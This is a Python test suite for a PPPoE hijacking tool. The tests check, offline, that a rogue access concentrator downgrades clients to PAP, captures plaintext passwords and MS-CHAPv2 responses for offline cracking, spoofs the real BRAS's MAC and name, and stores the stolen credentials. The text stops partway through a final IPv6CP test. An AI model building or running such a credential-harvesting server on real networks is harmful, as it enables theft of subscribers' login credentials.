# -*- coding: utf-8 -*-
"""PPPoE 劫持 v2 离线回归测试

把伪造的 PPPoE 报文喂给状态机，检查它「应该发出去的帧」，
全程不碰真实网卡（Engine.handle 是纯逻辑，发送靠 emit 回调注入）。
"""
import os
import sys
import tempfile
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pppoe_hijack_py3 as H

SRV = "0a:0a:0a:0a:0a:0a"
CLI = "11:22:33:44:55:66"
CLI2 = "22:33:44:55:66:77"
BRAS = "aa:bb:cc:dd:ee:ff"

FAILED = []


def hexmac(mac):
    return mac.replace(":", "").lower()


def S(engine, mac):
    """按 MAC 取会话（v2.1 起 sessions 的键是 (MAC, sessionid)）"""
    for (m, _sid), s in engine.sessions.items():
        if m == mac:
            return s
    raise KeyError(mac)


def has_session(engine, mac):
    return any(m == mac for m, _sid in engine.sessions)


def disc(code, tags_hex, src=CLI, dst="ff:ff:ff:ff:ff:ff", vlan=""):
    """PPPoE 发现帧（原始字节构造，与 2016 年的实际报文一致）

    vlan 传完整 tag 链 hex（"81000001"=802.1Q VID 1；QinQ 传
    "88a800648100000a"），照原样插在以太 type 之前。
    """
    et = "8863"
    body = "%02x" % code + "0000" + ("%04x" % (len(tags_hex) // 2)) + tags_hex
    if vlan:
        et = vlan + "8863"
    return H.Ether(bytes.fromhex(hexmac(dst) + hexmac(src) + et + "11" + body))


def sess(proto, payload_hex, src=CLI, sid=1, dst=SRV, vlan=""):
    """PPPoE 会话帧: Ether / PPPoE(code=0) / PPP(proto) / payload"""
    plen = len(payload_hex) // 2
    et = "8864"
    body = ("00" + "%04x" % sid + "%04x" % (plen + 2) + "%04x" % proto + payload_hex)
    if vlan:
        et = vlan + "8864"
    return H.Ether(bytes.fromhex(hexmac(dst) + hexmac(src) + et + "11" + body))


def decode(frame: bytes) -> dict:
    """拆我方发出的帧（自动跳过 VLAN tag）"""
    off = 12
    while int.from_bytes(frame[off:off + 2], "big") in (0x8100, 0x88A8):
        off += 4
    et = int.from_bytes(frame[off:off + 2], "big")
    sid = int.from_bytes(frame[off + 4:off + 6], "big")
    plen = int.from_bytes(frame[off + 6:off + 8], "big")
    body = frame[off + 8:off + 8 + plen]
    if et == 0x8864:
        return {"et": et, "code": frame[off + 3], "sid": sid, "plen": plen,
                "vlan": frame[12:off] if off > 12 else b"",
                "proto": int.from_bytes(body[:2], "big"), "payload": body[2:]}
    return {"et": et, "code": frame[off + 3], "sid": sid, "plen": plen,
            "vlan": frame[12:off] if off > 12 else b"", "proto": None, "payload": body}


def mk(**kw):
    cfg = H.Config()
    for k, v in kw.items():
        setattr(cfg, k, v)
    cfg.finalize()
    out = []
    return H.PPPoEServer(cfg, emit=out.append), out


def _err(fn):
    """跑一个应当抛异常的动作，返回异常对象（没抛则返回 None）"""
    try:
        fn()
    except BaseException as exc:     # SystemExit 也要抓：argparse 失败走这条
        return exc
    return None


def check(label, cond, detail=""):
    mark = "  [PASS] " if cond else "  [FAIL] "
    print(mark + label + (("   " + str(detail)) if detail else ""))
    if not cond:
        FAILED.append(label)


def banner(title):
    print()
    print("=" * 78)
    print(title)
    print("=" * 78)


# =============================================================== A 发现阶段
banner("A. PADI → PADO（tag 结构与 Host-Uniq 回显）")
e, out = mk(learn_ac=False)
tags = "01010000" + "01030004aabbccdd"
e.handle_guard(disc(0x09, tags))
d = decode(out[0])
print("  dst=%s src=%s code=%#04x sid=%#06x tags=%s"
      % (out[0][:6].hex(), out[0][6:12].hex(), d["code"], d["sid"], d["payload"].hex()))
check("PADO 目的 = 客户端 MAC", out[0][0:6] == bytes.fromhex(hexmac(CLI)))
check("PADO 源 = 伪装 MAC", out[0][6:12] == bytes.fromhex(hexmac(SRV)))
check("eth_type=0x8863 / code=PADO(0x07) / sid=0", d["et"] == 0x8863 and d["code"] == 0x07 and d["sid"] == 0)
check("tag = Service-Name+AC-Name('^_^')+Host-Uniq 原样回显",
      d["payload"].hex() == "01010000010200035e5f5e01030004aabbccdd",
      "不回显 Host-Uniq 的话多数客户端会丢掉 PADO")

banner("B. PADR → PADS（sessionid 分配）")
sent_before = len(out)
e.handle_guard(disc(0x19, tags))
d = decode(out[-1])
check("code=PADS(0x65)", d["code"] == 0x65)
check("第一个客户端分到 sessionid=0x01（原版硬编码 0x01，v2 自动分配）", d["sid"] == 0x01)
e.handle_guard(disc(0x19, tags, src=CLI2))
d2 = decode(out[-1])
check("第二个客户端分到不同 sessionid=0x02", d2["sid"] == 0x02, "sid=%#06x" % d2["sid"])
e3, out3 = mk(sessionid=0x2A)
e3.handle_guard(disc(0x19, tags))
check("--sessionid 0x2a 时固定使用该值", decode(out3[-1])["sid"] == 0x2A)
e4, out4 = mk(learn_ac=False)
e4.handle_guard(disc(0x09, "01010000"))
check("PADI 不带 Host-Uniq 时 tag 只有 Service-Name+AC-Name",
      decode(out4[0])["payload"].hex() == "01010000010200035e5f5e")

# =============================================================== C LCP
banner("C. 客户端 LCP-Config-Req → Ack(可接受选项) + Nak(塞入认证协议) + 我方 Req")
e, out = mk(learn_ac=False)
e.handle_guard(disc(0x19, tags))
out.clear()
CLI_REQ = "0107000e" + "010405dc" + "05065e630ab8"      # code=1 id=7 MRU1500 + Magic，没提认证
e.handle_guard(sess(0xC021, CLI_REQ))
for i, f in enumerate(list(out), 1):
    d = decode(f)
    print("  #%d proto=%#06x lcp_code=%d id=%d %s"
          % (i, d["proto"], d["payload"][0], d["payload"][1], d["payload"].hex()))
check("共 3 帧: Ack + Nak + 我方 Config-Req", len(out) == 3)
check("第1帧 = Configure-Ack(2)，原样回显可接受选项",
      decode(out[0])["payload"][0] == 2 and decode(out[0])["payload"][4:].hex() == "010405dc05065e630ab8")
check("第2帧 = Configure-Nak(3)，内含 Auth-Protocol=PAP(0xc023)",
      decode(out[1])["payload"][0] == 3 and "0304c023" in decode(out[1])["payload"].hex())
check("第3帧 = 我方 Configure-Request(1) id=1", decode(out[2])["payload"][0] == 1 and decode(out[2])["payload"][1] == 1)
check("我方 Req 字节与原版完全一致（长度 18，含 4 个尾 0）",
      decode(out[2])["payload"].hex() == "01010012" + "010405c80304c02305065e630ab800000000",
      "与原版 LCP_REQ_OPTIONS 逐字节相同")

e, out = mk(learn_ac=False, strict_rfc=True)
e.handle_guard(disc(0x19, tags))
out.clear()
e.handle_guard(sess(0xC021, CLI_REQ))
req = decode(out[-1])["payload"]
check("--strict-rfc 时长度字段=4+14=18 且尾 0 消失（RFC 1661 口径）",
      int.from_bytes(req[2:4], "big") == 18 and req[4:].hex() == "010405c80304c02305065e630ab8")

banner("D. 客户端 Ack 我方 Req → LCP up")
e, out = mk(learn_ac=False)
e.handle_guard(disc(0x19, tags))
e.handle_guard(sess(0xC021, CLI_REQ))
out.clear()
e.handle_guard(sess(0xC021, "02010012" + "010405c80304c02305065e630ab800000000"))
s = S(e, CLI)
check("LCP 状态 = up", s.lcp == "up")
check("认证协议为 PAP 时不主动发别的（0 帧）", out == [])

banner("E. --lcp-mode reject（复刻原版：全部 Reject 再下发我方 Req）")
e, out = mk(learn_ac=False, lcp_mode="reject")
e.handle_guard(disc(0x19, tags))
out.clear()
e.handle_guard(sess(0xC021, CLI_REQ))
check("第1帧 = Configure-Reject(4) 且原样回显客户端选项",
      decode(out[0])["payload"][0] == 4 and decode(out[0])["payload"][4:].hex() == "010405dc05065e630ab8")
check("第2帧 = 我方 Config-Req", decode(out[1])["payload"][0] == 1)

# =============================================================== F PAP
banner("F. PAP 明文凭据 + Nak 回显客户端 id")
e, out = mk(learn_ac=False)
e.handle_guard(disc(0x19, tags))
out.clear()
user, passwd = b"user01", b"pass123"
pap_body = ("01" + "08" + "%04x" % (5 + len(user) + len(passwd))
            + "%02x" % len(user) + user.hex() + "%02x" % len(passwd) + passwd.hex())
e.handle_guard(sess(0xC023, pap_body))
d = decode(out[-1])
print("  捕获:", e.creds[-1])
print("  回包: proto=%#06x payload=%s" % (d["proto"], d["payload"].hex()))
check("截获 user01/pass123", e.creds[-1]["username"] == "user01" and e.creds[-1]["password"] == "pass123")
check("回包 = PAP Authenticate-Nak(3) 且 id 回显客户端的 0x08（原版硬编码 0x02）",
      d["payload"].hex() == "030800060100")
check("凭据带 mac/sessionid/原始 hex",
      e.creds[-1]["mac"] == CLI and e.creds[-1]["sessionid"] == "0x0001"
      and e.creds[-1]["raw"] == pap_body)
check("会话保留（不再像原版那样删记录，靠 TTL 回收）", has_session(e, CLI))

banner("G. PAP 重传去重：同一帧只落一次盘、回包逐字节相同")
before = bytes(out[-1])
n_creds = len(e.creds)
e.handle_guard(sess(0xC023, pap_body))
check("回包与上次逐字节相同", bytes(out[-1]) == before)
check("凭据没有重复落盘", len(e.creds) == n_creds)

banner("H. --pap-mode ack：回 Ack 留住会话")
e, out = mk(learn_ac=False, pap_mode="ack")
e.handle_guard(disc(0x19, tags))
out.clear()
e.handle_guard(sess(0xC023, pap_body))
check("回包 = PAP Authenticate-Ack(2)",
      decode(out[-1])["payload"].hex() == "020800060100")
check("会话标记已认证", S(e, CLI).authed)

# =============================================================== I CHAP
banner("I. 客户端 Nak 拒绝 PAP 并要求 MS-CHAPv2 → 切换 + 下发 Challenge")
e, out = mk(learn_ac=False)
e.handle_guard(disc(0x19, tags))
e.handle_guard(sess(0xC021, CLI_REQ))            # 我方 Req(pap) id=1
out.clear()
e.handle_guard(sess(0xC021, "03010009" + "0305c22381"))   # Nak: 我要 MS-CHAPv2
s = S(e, CLI)
req = decode(out[-1])["payload"]
print("  切换后: auth=%s 我方Req id=%d %s" % (s.auth_kind, req[1], req.hex()))
check("认证协议切换为 mschapv2", s.auth_kind == "mschapv2")
check("重发我方 Req 且内含 MS-CHAPv2 选项 0305c22381",
      req[0] == 1 and req[1] == 2 and "0305c22381" in req.hex())

out.clear()
e.handle_guard(sess(0xC021, "02" + "%02x" % req[1] + "%04x" % (4 + len(req[4:])) + req[4:].hex()))
d = decode(out[-1])
print("  Challenge: proto=%#06x code=%d id=%d value_size=%d value=%s"
      % (d["proto"], d["payload"][0], d["payload"][1], d["payload"][4], d["payload"][5:21].hex()))
check("Ack 之后立刻下发 CHAP Challenge(code=1, value_size=16)",
      d["proto"] == 0xC223 and d["payload"][0] == 1 and d["payload"][4] == 16)
check("Challenge 与我们记录的一致", d["payload"][5:21] == s.chap_value)

pc = bytes(range(16))
nt = b"\xab" * 24
value = b"\x10" + pc + b"\x00" * 8 + nt + b"\x00"          # 50 字节 MS-CHAPv2 Response
name = b"user01"
chap_resp = ("02" + "%02x" % s.chap_ident + "%04x" % (5 + len(value) + len(name))
             + "%02x" % len(value) + value.hex() + name.hex())
out.clear()
e.handle_guard(sess(0xC223, chap_resp))
rec = e.creds[-1]
print("  捕获:", {k: rec[k] for k in ("auth", "username", "peer_challenge", "nt_response", "auth_challenge")})
print("  回包:", decode(out[-1])["payload"].hex())
check("落盘 auth=mschapv2 + username", rec["auth"] == "mschapv2" and rec["username"] == "user01")
check("peer_challenge 解析正确", rec["peer_challenge"] == pc.hex())
check("nt_response 解析正确（供离线爆破）", rec["nt_response"] == nt.hex())
check("auth_challenge = 我们自己发的 challenge", rec["auth_challenge"] == s.chap_value.hex())
check("回包 = CHAP Failure(4) 且 id 一致",
      decode(out[-1])["payload"][0] == 4 and decode(out[-1])["payload"][1] == s.chap_ident)
n = len(e.creds)
e.handle_guard(sess(0xC223, chap_resp))
check("CHAP 重传也不重复落盘", len(e.creds) == n)

banner("J. --auth-order chap + MD5-CHAP 响应")
e, out = mk(learn_ac=False, auth_order="chap")
e.handle_guard(disc(0x19, tags))
e.handle_guard(sess(0xC021, CLI_REQ))
out.clear()
e.handle_guard(sess(0xC021, "02010012" + "010405c80304c02305065e630ab800000000"))
check("认证方式为 chap 时也主动下发 Challenge", decode(out[-1])["payload"][0] == 1)
s = S(e, CLI)
md5resp = b"\x77" * 16
e.handle_guard(sess(0xC223, "02" + "%02x" % s.chap_ident + "%04x" % (5 + 16 + 6)
                    + "10" + md5resp.hex() + b"user02".hex()))
check("MD5-CHAP 响应落盘为 response=16 字节", e.creds[-1]["response"] == md5resp.hex()
      and e.creds[-1]["username"] == "user02")

banner("K. --chap-reply success")
e, out = mk(learn_ac=False, auth_order="chap", chap_reply="success")
e.handle_guard(disc(0x19, tags))
e.handle_guard(sess(0xC021, CLI_REQ))
out.clear()
e.handle_guard(sess(0xC021, "02010012" + "010405c80304c02305065e630ab800000000"))
s = S(e, CLI)
e.handle_guard(sess(0xC223, "02" + "%02x" % s.chap_ident + "%04x" % (5 + 16)
                    + "10" + (b"\x11" * 16).hex()))
check("回包 = CHAP Success(3)", decode(out[-1])["payload"][0] == 3)

banner("L. 客户端要的算法不在 --auth-order 里时不乱切")
e, out = mk(learn_ac=False, auth_order="pap")
e.handle_guard(disc(0x19, tags))
e.handle_guard(sess(0xC021, CLI_REQ))
out.clear()
e.handle_guard(sess(0xC021, "03010009" + "0305c22380"))       # 客户端要 MS-CHAPv1
s = S(e, CLI)
check("--auth-order pap 时保持 pap，只重发我方 Req（不会偷偷换成没勾的协议）",
      s.auth_kind == "pap" and len(out) == 1 and decode(out[-1])["payload"][0] == 1)
e, out = mk(learn_ac=False)                                     # 默认顺序含 mschapv1
e.handle_guard(disc(0x19, tags))
e.handle_guard(sess(0xC021, CLI_REQ))
out.clear()
e.handle_guard(sess(0xC021, "03010009" + "0305c22380"))
s = S(e, CLI)
check("默认顺序下能接住 MS-CHAPv1 并下发 0305c22380",
      s.auth_kind == "mschapv1" and "0305c22380" in decode(out[-1])["payload"].hex())

# =============================================================== M 保活/状态机
banner("M. Echo-Request → Echo-Reply（不回就会被客户端判掉线）")
e, out = mk(learn_ac=False)
e.handle_guard(disc(0x19, tags))
out.clear()
e.handle_guard(sess(0xC021, "09330008" + "5e630ab8"))
d = decode(out[-1])
check("回包 code=Echo-Reply(10) 且 id 一致",
      d["payload"][0] == 10 and d["payload"][1] == 0x33)
check("Magic-Number 原样回显", d["payload"][4:].hex() == "5e630ab8")

banner("N. Terminate-Request → Terminate-Ack + 回收会话")
e, out = mk(learn_ac=False)
e.handle_guard(disc(0x19, tags))
out.clear()
e.handle_guard(sess(0xC021, "0505000400000000"))
check("回包 = Terminate-Ack(6)", decode(out[-1])["payload"][0] == 6)
check("会话已回收", not has_session(e, CLI))

banner("O. 会话 TTL 回收 + 同 MAC 重新拨号仍能被抓（修掉原版漏抓）")
now = [1000.0]
cfg = H.Config()
cfg.learn_ac = False
cfg.session_ttl = 10.0
cfg.finalize()
out = []
e = H.PPPoEServer(cfg, emit=out.append, clock=lambda: now[0])
e.handle_guard(disc(0x19, tags))
e.handle_guard(sess(0xC021, CLI_REQ))
check("首次接触下发了我方 Req", len(out) == 4 and decode(out[-1])["payload"][0] == 1,
      "PADS + Ack + Nak + Req = %d 帧" % len(out))
now[0] += 20.0
e.reap()
check("空闲超过 TTL 的会话被回收", not has_session(e, CLI))
out.clear()
e.handle_guard(sess(0xC021, CLI_REQ))
check("同一 MAC 重新拨号后重新走一遍（原版会因 clientMap 残留直接漏抓）",
      len(out) == 3 and decode(out[-1])["payload"][0] == 1)

banner("P. 我方 LCP-Config-Req 定时重传（原版从不重传）")
now = [2000.0]
cfg = H.Config()
cfg.learn_ac = False
cfg.session_ttl = 0
cfg.lcp_retry = 3.0
cfg.lcp_maxretry = 2
cfg.finalize()
out = []
e = H.PPPoEServer(cfg, emit=out.append, clock=lambda: now[0])
e.handle_guard(disc(0x19, tags))
e.handle_guard(sess(0xC021, CLI_REQ))
base = len(out)
now[0] += 3.5
e.reap()
check("到点重传 1 次且 id 递增", len(out) == base + 1
      and decode(out[-1])["payload"][1] == 2)
now[0] += 3.5
e.reap()
check("第二次重传", len(out) == base + 2)
now[0] += 3.5
e.reap()
check("超过 --lcp-maxretry 后放弃，不再发", len(out) == base + 2)

# =============================================================== Q IPCP
banner("Q. --pap-mode ack + --ipcp on：下发假地址把客户端留住")
e, out = mk(learn_ac=False, pap_mode="ack", ipcp="on")
e.handle_guard(disc(0x19, tags))
e.handle_guard(sess(0xC023, pap_body))
out.clear()
e.handle_guard(sess(0x8021, "0101000a" + "030600000000"))     # IPCP Req: 地址 0.0.0.0
for i, f in enumerate(list(out), 1):
    d = decode(f)
    print("  #%d proto=%#06x code=%d id=%d %s" % (i, d["proto"], d["payload"][0], d["payload"][1], d["payload"].hex()))
check("先 Nak 把它按到 10.0.0.2",
      decode(out[0])["payload"][0] == 3 and decode(out[0])["payload"][4:].hex() == "03060a000002")
check("同时下发我方 Config-Req（伪网关 10.0.0.1）",
      decode(out[1])["payload"][0] == 1 and decode(out[1])["payload"][4:].hex() == "03060a000001")
out.clear()
e.handle_guard(sess(0x8021, "0102000a" + "03060a000002"))     # 客户端改用 10.0.0.2
check("客户端改用我们的地址后回 Ack",
      decode(out[0])["payload"][0] == 2 and decode(out[0])["payload"][4:].hex() == "03060a000002")
check("记录的客户端地址 = 10.0.0.2", S(e, CLI).ipcp_ip == "10.0.0.2")
e2, out2 = mk(learn_ac=False, pap_mode="nak", ipcp="auto")
check("--ipcp auto 且 PAP 回 Nak 时不进 IPCP", e2.cfg.ipcp_enabled is False)
e2.handle_guard(disc(0x19, tags))
out2.clear()
e2.handle_guard(sess(0x8021, "0101000a" + "030600000000"))
check("IPCP 关闭时对 IPCP 请求无动作", out2 == [])

# =============================================================== R 冒充真 BRAS
banner("R. --learn-ac：从真 BRAS 的 PADO 学 MAC 与 AC-Name 并冒充")
e, out = mk()
e.handle_guard(disc(0x07, "01010000" + "01020005" + "4252415331", src=BRAS, dst=CLI))
check("伪装 MAC 换成真 BRAS 的 MAC", e.mac == BRAS)
check("AC-Name 学为 BRAS1", e.ac_name == "BRAS1")
out.clear()
e.handle_guard(disc(0x09, "01010000"))
check("之后的 PADO 用真 BRAS 的 MAC 与名字（不再是一眼可见的 0a:0a:...)",
      out[0][6:12] == bytes.fromhex(hexmac(BRAS))
      and decode(out[0])["payload"].hex() == "01010000" + "01020005" + "4252415331")
e2, out2 = mk(learn_ac=False)
e2.handle_guard(disc(0x07, "01010000" + "01020005" + "4252415331", src=BRAS, dst=CLI))
check("--no-learn-ac 时不冒充", e2.mac == SRV and out2 == [])

# =============================================================== S 过滤/自环
banner("S. 自环防护 / 非本机报文 / 无关协议")
e, out = mk(learn_ac=False)
e.handle_guard(H.Ether(bytes.fromhex(hexmac(CLI) + hexmac(SRV) + "8863" + "1109000000"
                                     + "01010000")))
check("伪装 MAC 自己发的包被丢弃（原版会无限发包）", out == [] and e.stats["self_loop"] == 1)
e.handle_guard(sess(0xC021, CLI_REQ, dst=CLI2))
check("目的不是我们的会话帧被丢弃", out == [] and e.stats["not_for_us"] == 1)
e.handle_guard(H.Ether(bytes.fromhex(hexmac("ff:ff:ff:ff:ff:ff") + hexmac(CLI)
                                     + "0806" + "00" * 28)))
check("ARP 不引起任何动作", out == [])

banner("T. BPF 构造")
strict = H.Config(dst_filter="strict").finalize()
anyf = H.Config(dst_filter="any").finalize()
auto = H.Config().finalize()
b1 = H.build_bpf(strict, SRV)
b2 = H.build_bpf(anyf, SRV)
print("  strict:", b1)
print("  any   :", b2)
check("strict 模式加了 ether dst 条件（砍无关流量）",
      "ether dst %s" % SRV in b1 and "ether dst ff:ff:ff:ff:ff:ff" in b1)
check("any 模式不加 dst 条件（MAC 未对准时也能看见）", "ether dst" not in b2)
check("两者都排除自己的源 MAC", "not ether src %s" % SRV in b1 and "not ether src %s" % SRV in b2)
check("dst_filter=auto 时：未指定 --mac → any", auto.dst_filter == "any")
check("dst_filter=auto 时：指定 --mac → strict",
      H.Config(mac=BRAS).finalize().dst_filter == "strict")

# =============================================================== U 落盘
banner("U. 凭据落盘（JSONL / SQLite）")
tmp = tempfile.mkdtemp(prefix="pppoe_test_")
jl = os.path.join(tmp, "creds.jsonl")
st = H.Store(jl)
st.add({"mac": CLI, "auth": "pap", "username": "user01", "password": "pass123",
        "sessionid": "0x0001", "bras_mac": SRV, "ac_name": "^_^"})
st.close()
line = open(jl, encoding="utf-8").read().strip()
import json
rec = json.loads(line)
print("  jsonl:", line)
check("JSONL 一行一条且含时间戳/认证类型/原始字段",
      rec["username"] == "user01" and rec["password"] == "pass123"
      and rec["auth"] == "pap" and rec["ts"] and rec["bras_mac"] == SRV)

db = os.path.join(tmp, "creds.db")
st2 = H.Store(db)
st2.add({"mac": CLI, "auth": "mschapv2", "username": "user01",
         "nt_response": "ab" * 24, "peer_challenge": "cd" * 16})
st2.close()
import sqlite3
conn = sqlite3.connect(db)
row = conn.execute("SELECT auth, username, nt_response, ts FROM creds").fetchone()
conn.close()
print("  sqlite:", row)
check("SQLite 表结构与字段齐全", row[0] == "mschapv2" and row[1] == "user01"
      and row[2] == "ab" * 24 and row[3])

banner("V. 配置优先级（TOML < CLI）")
tpl = os.path.join(tmp, "conf.toml")
with open(tpl, "w", encoding="utf-8") as fh:
    fh.write('[pppoe]\nac_name = "FROMFILE"\npap_mode = "ack"\nauth_order = "mschapv2,pap"\n')
cfg = H.build_config(["-c", tpl, "--ac-name", "FROMCLI"])
check("文件里的 pap_mode 生效", cfg.pap_mode == "ack")
check("CLI 覆盖文件里的 ac_name", cfg.ac_name == "FROMCLI")
check("认证顺序解析为列表", cfg.auth_list == ["mschapv2", "pap"])
check("pap_mode=ack 时 ipcp auto → 开启", cfg.ipcp_enabled is True)

banner("W. 令牌桶限速")
rl = H.RateLimiter(1000)
rl.tokens = 2.0
t0 = time.time()
rl.wait()
rl.wait()
dt = time.time() - t0
check("有余量时不阻塞", dt < 0.1 and rl.tokens < 1.0, "耗时 %.3fs" % dt)

# =============================================================== X 现代设备
banner("X. VLAN / QinQ（光猫桥接下 PPPoE 常被塞进 VLAN）")
TAGS_PADI = "01010000010200035e5f5e01030004aabbccdd"
TAG_VLAN43 = "8100" + "602b"                      # tpid=802.1Q, pcp=3, vid=43
TAG_VLAN1 = "81000001"

e, out = mk(vlan="auto")
e.handle_guard(disc(0x09, TAGS_PADI, vlan=TAG_VLAN1))
d = decode(out[0])
check("--vlan auto：客户端带 802.1Q tag 时 PADO 原样带回 1 层 tag",
      d["vlan"] == bytes.fromhex(TAG_VLAN1), d["vlan"].hex())

e2, out2 = mk(vlan="off", learn_ac=False)
e2.handle_guard(disc(0x09, TAGS_PADI, vlan=TAG_VLAN1))
check("默认 --vlan off：不带 tag（= 2016 原版行为）", decode(out2[0])["vlan"] == b"")

e3, out3 = mk(vlan="43", vlan_prio=3, learn_ac=False)
e3.handle_guard(disc(0x09, TAGS_PADI))
check("--vlan 43 --vlan-prio 3：强制插入指定 tag",
      decode(out3[0])["vlan"] == bytes.fromhex(TAG_VLAN43), decode(out3[0])["vlan"].hex())

e4, out4 = mk(vlan="auto")
e4.handle_guard(disc(0x09, TAGS_PADI, vlan="88a800648100 000a".replace(" ", "")))
check("QinQ（802.1ad 外层 + 802.1Q 内层）两层都原样带回",
      decode(out4[0])["vlan"] == bytes.fromhex("88a800648100 000a".replace(" ", "")),
      decode(out4[0])["vlan"].hex())

e5, out5 = mk(vlan="auto")
e5.handle_guard(disc(0x09, TAGS_PADI, vlan="81000064"))
e5.handle_guard(disc(0x19, TAGS_PADI, vlan="81000064"))
out5.clear()
e5.handle_guard(sess(0xC021, "0101000e" + "010405dc" + "05065e630ab8", sid=1,
                     vlan="81000064"))
check("会话阶段（LCP）也走同一条 VLAN 通道", decode(out5[0])["vlan"] == bytes.fromhex("81000064"))

banner("Y. Service-Name（现代路由器/机顶盒都带自己的服务名）")
svc = "shanghai-pppoe"
e, out = mk(learn_ac=False)
e.handle_guard(disc(0x09, "0101%04x%s" % (len(svc), svc.encode().hex()) + "01030004aabbccdd"))
tags_out = decode(out[0])["payload"]
check("PADI 带 Service-Name 时 PADO 原样回显同一个名字",
      tags_out.hex().startswith("0101%04x%s" % (len(svc), svc.encode().hex())), tags_out.hex()[:40])

e2, out2 = mk(service_name="shanghai-pppoe", service_strict=True, learn_ac=False)
e2.handle_guard(disc(0x09, "01010004" + "6f746865" + "01030004aabbccdd"))   # "othe"
d2 = decode(out2[0])
err = d2["payload"].find(bytes.fromhex("0201"))
check("--service-strict：不提供的名字 → PADS(0x65) + Service-Name-Error(0x0201)",
      d2["code"] == 0x65 and err >= 0 and d2["sid"] == 0, d2["payload"].hex())
check("Service-Name-Error 计数", e2.stats["service_name_error"] == 1)

banner("Z. Relay-Session-Id / AC-Cookie / PPP-Max-Payload")
RELAY = "01100004" + "deadbeef"
e, out = mk(learn_ac=False)
e.handle_guard(disc(0x09, TAGS_PADI + RELAY))
check("PADO 回显 Relay-Session-Id（双拨/中继场景必须带）",
      bytes.fromhex("01100004deadbeef") in decode(out[0])["payload"])
e2, out2 = mk(relay_sid=False, learn_ac=False)
e2.handle_guard(disc(0x09, TAGS_PADI + RELAY))
check("--no-relay-sid 时不回显", bytes.fromhex("01100004") not in decode(out2[0])["payload"])

e3, out3 = mk(ac_cookie=True, learn_ac=False)
e3.handle_guard(disc(0x09, TAGS_PADI))
tags3 = decode(out3[0])["payload"]
pos = tags3.find(bytes.fromhex("0104"))
check("--ac-cookie：PADO 带 AC-Cookie(0x0104) 且长度 16",
      pos >= 0 and int.from_bytes(tags3[pos + 2:pos + 4], "big") == 16)
cookie = tags3[pos + 4:pos + 20]
e3.handle_guard(disc(0x19, TAGS_PADI + "0104%04x%s" % (16, cookie.hex())))
check("客户端 PADR 回显 cookie 时不记 cookie_miss", e3.stats["cookie_miss"] == 0)
e3.handle_guard(disc(0x09, TAGS_PADI, src=CLI2))       # 另一个客户端先拿到 cookie
e3.handle_guard(disc(0x19, TAGS_PADI, src=CLI2))       # 然后故意不回带
check("客户端不回 cookie 时宽容处理（只记 cookie_miss，不丢包）",
      e3.stats["cookie_miss"] == 1 and has_session(e3, CLI2))

e4, out4 = mk(max_payload=1500, learn_ac=False)
e4.handle_guard(disc(0x09, TAGS_PADI + "01200002" + "05dc"))
e4.handle_guard(disc(0x19, TAGS_PADI + "01200002" + "05dc"))
check("PADS 回显 PPP-Max-Payload(0x0120)=1500（RFC 4638）",
      bytes.fromhex("0120000205dc") in decode(out4[0])["payload"])
e5, out5 = mk(max_payload=0, learn_ac=False)
e5.handle_guard(disc(0x09, TAGS_PADI + "01200002" + "05dc"))
check("--max-payload 0（默认）时不主动带 0x0120",
      bytes.fromhex("01200002") not in decode(out5[0])["payload"])
e6, out6 = mk(max_payload=1400, learn_ac=False)
e6.handle_guard(disc(0x09, TAGS_PADI + "01200002" + "05dc"))
check("客户端要 1500、我们只支持 1400 时按我们的值回（不吹牛）",
      bytes.fromhex("012000020578") in decode(out6[0])["payload"])

banner("AA. 多拨：同一 MAC 的多条会话")
e, out = mk(learn_ac=False)
e.handle_guard(disc(0x09, TAGS_PADI))
e.handle_guard(disc(0x19, TAGS_PADI))
sid1 = decode(out[-1])["sid"]
e.pending.clear()                       # 模拟第二路拨号（PADI 已过 5s 窗口）
e.clock = lambda: 100.0
e.handle_guard(disc(0x19, TAGS_PADI))
sid2 = decode(out[-1])["sid"]
check("同一 MAC 第二次 PADR 拿到不同 sessionid", sid1 != sid2 and sid2 != 0,
      "sid1=%#06x sid2=%#06x" % (sid1, sid2))
check("两条会话同时存在（光猫双拨能各抓一份）", has_session(e, CLI) and len(e.sessions) == 2)

e2, out2 = mk(multi_session=False, learn_ac=False)
e2.handle_guard(disc(0x19, TAGS_PADI))
e2.clock = lambda: 100.0
e2.handle_guard(disc(0x19, TAGS_PADI))
check("--no-multi-session：第二次 PADR 复用同一条会话（不新建）", len(e2.sessions) == 1)

e3, out3 = mk(learn_ac=False)
e3.handle_guard(disc(0x19, TAGS_PADI))
out3.clear()
e3.handle_guard(sess(0xC021, "0107000e" + "1a0405dc" + "05065e630ab8", sid=sid1))
check("两条会话各自的 LCP 帧按 sessionid 分开处理",
      decode(out3[0])["sid"] == sid1 if e3.sessions else False)
out3.clear()
e3.handle_guard(disc(0xA7, "", src=CLI))
check("PADT 只回收指定 sessionid 的那条", len(e3.sessions) == 0)

banner("AB. LCP：MRU / RFC 2516 §7 必须拒绝的选项")
e, out = mk(mru=1492, learn_ac=False)
e.handle_guard(disc(0x19, TAGS_PADI))
out.clear()
e.handle_guard(sess(0xC021, "0107000e" + "010405dc" + "05065e630ab8"))
req = [f for f in out if decode(f)["payload"][0] == 1][0]
check("--mru 1492 → 我方 Req 里 MRU 选项为 05d4",
      bytes.fromhex("010405d4") in decode(req)["payload"], decode(req)["payload"].hex())

e2, out2 = mk(mru=1492, learn_ac=False)
e2.handle_guard(disc(0x19, TAGS_PADI + "01200002" + "05dc"))
out2.clear()
e2.handle_guard(sess(0xC021, "0107000e" + "010405dc" + "05065e630ab8"))
req2 = [f for f in out2 if decode(f)["payload"][0] == 1][0]
check("客户端带 PPP-Max-Payload=1500 时 MRU 可用满 1492",
      bytes.fromhex("010405d4") in decode(req2)["payload"])

e3, out3 = mk(learn_ac=False)
e3.handle_guard(disc(0x19, TAGS_PADI))
out3.clear()
# 客户端要 ACFC(08 02) + ACCM(02 06 00000000) —— RFC 2516 §7 要求 AC 拒绝
e3.handle_guard(sess(0xC021, "01070014" + "010405dc" + "020600000000" + "0802"))
codes = [decode(f)["payload"][0] for f in out3]
rej = [f for f in out3 if decode(f)["payload"][0] == 4]
check("ACFC/ACCM 被 Configure-Reject（只 Ack 合法选项）",
      4 in codes and 2 in codes and rej and
      bytes.fromhex("0802") in decode(rej[0])["payload"],
      "codes=%s" % codes)

banner("AC. IPv6CP（双栈光猫）")
IID = "0a0a0a0afffe0a0a"
e, out = mk(ipv6cp="on", learn_ac=False)
e.handle_guard(disc(0x19, TAGS_PADI))
out.clear()
e.handle_guard(sess(0x8057, "0102000e" + "010a" + IID))     # Conf-Req / id=2 / len=14 / opt IID
